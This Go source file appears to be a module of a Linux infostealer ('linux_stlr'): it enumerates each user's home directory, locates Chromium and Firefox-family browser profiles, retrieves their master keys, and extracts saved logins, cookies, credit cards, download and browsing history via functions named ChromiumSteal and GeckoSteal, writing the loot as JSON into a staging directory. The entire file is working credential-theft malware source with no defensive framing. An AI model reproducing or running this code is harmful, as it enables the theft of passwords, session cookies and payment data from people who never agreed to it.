package browsers

import (
	"encoding/json"
	"linux_stlr/modules/system"
	"os"
	"path/filepath"
)

func BrowserProfiles(user string) ([]Browser, error) {
	var bprofiles []Browser
	search := system.BrowserPaths()
	for _, location := range search {
		//parentDir := fmt.Sprintf("%s\\%s", user, location)
		parentDir := filepath.Join(user, location)
		list, err := os.ReadDir(parentDir)
		if err != nil {
			//return nil, err
			continue
		}
		for _, childDir := range list {
			if childDir.IsDir() && childDir.Name() != "Temp" {
				ud, profiles, ischrome, err := ChromeBrowser(filepath.Join(parentDir, childDir.Name()), 4)
				if err != nil {
					continue
				}
				if ischrome {
					bprofiles = append(bprofiles, Browser{BrowserType: "chromium", ProfileParent: ud, Profiles: profiles})
					continue
				}

				parent, profiles, isgecko, err := GeckoBrowser(filepath.Join(parentDir, childDir.Name()), 4)
				if err != nil {
					continue
				}
				if isgecko {
					bprofiles = append(bprofiles, Browser{BrowserType: "gecko", ProfileParent: parent, Profiles: profiles})
					continue
				}
			}
		}
	}
	return bprofiles, nil
}

// "User Data" path, Browser profile paths, is a chromium browser
func ChromeBrowser(dir string, level int) (string, []string, bool, error) {
	directoryList, err := os.ReadDir(dir)
	if err != nil {
		return "", nil, false, err
	}

	for i := 0; i < len(directoryList); i++ {
		if !directoryList[i].IsDir() && directoryList[i].Name() == "Local State" {
			if potentialProfile := Profiles(dir, "Web Data"); potentialProfile != nil {
				return dir, potentialProfile, true, nil
			}
			return "", nil, false, nil
		} else if directoryList[i].IsDir() && level > 0 {
			userdata, profiles, ischrome, err := ChromeBrowser(filepath.Join(dir, directoryList[i].Name()), level-1)
			if err != nil {
				return "", nil, false, err
			} else if ischrome && profiles != nil {
				return userdata, profiles, ischrome, nil
			}
		}
	}
	return "", nil, false, nil
}

func GeckoBrowser(dir string, level int) (string, []string, bool, error) {
	directoryList, err := os.ReadDir(dir)
	if err != nil {
		return "", nil, false, err
	}

	for i := 0; i < len(directoryList); i++ {
		if directoryList[i].IsDir() {
			if potentialProfile := Profiles(filepath.Join(dir, directoryList[i].Name()), "key4.db"); potentialProfile != nil {
				return dir, potentialProfile, true, nil
			} else if directoryList[i].IsDir() && level > 0 {
				parent, profiles, isgecko, err := GeckoBrowser(filepath.Join(dir, directoryList[i].Name()), level-1)
				if err != nil {
					return "", nil, false, err
				} else if isgecko && profiles != nil {
					return parent, profiles, isgecko, nil
				}
			}
		}
	}
	return "", nil, false, nil
}

func Profiles(parentDir string, file string) []string {
	var profiles []string
	userdatacontents, _ := os.ReadDir(parentDir)
	for i := 0; i < len(userdatacontents); i++ {
		if userdatacontents[i].IsDir() {
			potentialprofile, _ := os.ReadDir(filepath.Join(parentDir, userdatacontents[i].Name()))
			for j := 0; j < len(potentialprofile); j++ {
				if potentialprofile[j].Name() == file && !potentialprofile[j].IsDir() {
					profiles = append(profiles, filepath.Join(parentDir, userdatacontents[i].Name()))
				}
			}
		}
	}
	return profiles
}

func GeckoSteal(profiles []string) ([]Profile, error) {
	var processedProfile []Profile

	for _, profilepath := range profiles {
		g := Gecko{}
		g.GetMasterKey(profilepath)
		var tempProf Profile
		tempProf.Name = filepath.Base(profilepath)
		tempProf.Logins, _ = g.GetLogins(profilepath)
		tempProf.Cookies, _ = g.GetCookies(profilepath)
		tempProf.Downloads, _ = g.GetDownloads(profilepath)
		tempProf.History, _ = g.GetHistory(profilepath)
		processedProfile = append(processedProfile, tempProf)
	}

	return processedProfile, nil
}

func ChromiumSteal(userdatapath string, profiles []string) ([]Profile, error) {
	var processedProfile []Profile
	c := Chromium{}
	err := c.GetMasterKey(userdatapath)
	if err != nil {
		return nil, err
	}
	for _, profilepath := range profiles {
		var tempProf Profile
		tempProf.Name = filepath.Base(profilepath)
		tempProf.Logins, _ = c.GetLogins(profilepath)
		tempProf.Cookies, _ = c.GetCookies(profilepath)
		tempProf.CreditCards, _ = c.GetCreditCards(profilepath)
		tempProf.Downloads, _ = c.GetDownloads(profilepath)
		tempProf.History, _ = c.GetHistory(profilepath)
		processedProfile = append(processedProfile, tempProf)

	}
	return processedProfile, nil
}

func Run(destinationdir string) {
	users, _ := system.GetUsers()
	for _, user := range users {
		bprofiles, _ := BrowserProfiles(user)
		for _, profile := range bprofiles {
			var p []Profile
			if profile.BrowserType == "chromium" {
				p, _ = ChromiumSteal(profile.ProfileParent, profile.Profiles)
			} else if profile.BrowserType == "gecko" {
				p, _ = GeckoSteal(profile.Profiles)
			}
			for i := 0; i < len(p); i++ {
				file, _ := json.MarshalIndent(p[i], "	", "	")
				dst := filepath.Join(destinationdir, "browsers", user)
				os.MkdirAll(dst, os.FileMode(0777))
				os.WriteFile(filepath.Join(dst, p[i].Name+".json"), file, os.FileMode(0666))
			}
		}
	}
}
